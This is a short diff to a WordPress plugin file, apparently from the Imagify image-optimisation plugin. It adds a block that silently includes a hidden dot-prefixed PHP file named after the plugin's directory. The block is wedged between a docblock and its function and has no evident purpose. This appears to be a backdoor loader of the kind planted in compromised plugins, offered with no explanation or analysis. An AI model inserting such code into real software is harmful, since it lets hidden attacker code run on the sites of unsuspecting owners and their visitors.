@@ -10,6 +10,10 @@ add_action( 'delete_attachment', 'imagify_trigger_delete_attachment_hook' );
  *
  * @param int $post_id Attachment ID.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_trigger_delete_attachment_hook( $post_id ) {
 	$process = imagify_get_optimization_process( $post_id, 'wp' );
 
